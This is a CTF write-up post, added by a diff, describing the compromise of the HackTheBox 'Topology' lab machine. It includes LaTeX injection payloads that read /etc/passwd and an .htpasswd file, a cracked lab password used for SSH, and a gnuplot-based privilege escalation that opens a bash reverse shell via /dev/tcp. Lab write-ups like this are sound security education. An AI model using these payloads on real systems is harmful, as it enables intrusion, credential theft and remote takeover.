@@ -1,0 +1,93 @@
+---
+layout: post
+title:  "Writeup of Topology (HackTheBox)"
+date:   2023-11-18 18:06:00 +0000
+categories: hackthebox
+author: brun0ne
+tags: htb hackthebox topology latex gnuplot pspy
+---
+
+
+# Discovery
+
+Looking through the website on **:80**, there is an email and domain **lklein@topology.htb**.
+
+Another domain: **latex.topology.htb**.
+
+`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.217 -H "Host: FUZZ.topology.htb" -fs 6767 -o subdomains.scan`
+
+```
+stats, dev
+```
+
+`dev.topology.htb` needs authentication.
+
+`stats.topology.htb` displays two images.
+
+# Attacking latex
+
+`GET /equation.php?eqn=\input{/etc/passwd}&submit= `
+
+```
+Illegal command detected. Sorry.
+```
+
+There is a file `http://latex.topology.htb/equationtest.log`.
+
+```
+pdfTeX, Version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian) 
+```
+
+**We can read one line of a file using:**
+
+`\newread\file \file\openin\file=/etc/passwd \read\file to\fileline \text{\fileline} \closein\file`
+
+**Reading longer files using:**
+
+`\newcommand{\y}{\read\file to\x \text{\x}} \newread\file \openin\file=/etc/passwd \y\y\y\y\y\y\y\y\y\y\y\y\y\y\y\y\y\y\ \closein\file`
+
+**Even better pretty-printing whole files:**
+
+`$ \lstinputlisting[caption=test]{/etc/passwd} $`
+
+**/etc/passwd:** [image](etcpasswd.png)
+
+**../equation.php:** [image](source.png)
+
+`/var/www/html/index.html` exists
+
+`/var/www/latex/equation.php` exists
+
+`/var/www/dev/.htaccess` exists
+
+```
+AuthType Basic
+AuthUserFile /var/www/dev/.htpasswd
+Require valid-user
+```
+
+**/var/www/dev/.htpasswd:** [image](htpasswd.png)
+
+```
+vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO
+```
+
+**Cracked:** `vdaisley:calculus20`
+
+# SSH - vdaisley
+
+`ssh vdaisley@10.10.11.217`
+
+**vdaisley:calculus20**
+
+#
+
+**Using pspy we see root executing:**
+
+`/bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;`
+
+[Gnuplot can execute system commands.](https://stackoverflow.com/questions/53519962/how-to-run-a-shell-command-in-gnuplot-and-place-the-output-in-new-file)
+
+`echo 'system("bash -c '"'bash -i >& /dev/tcp/10.10.14.144/9001 0>&1'"'")' > /opt/gnuplot/test.plt`
+
+`root.txt: <redacted>`
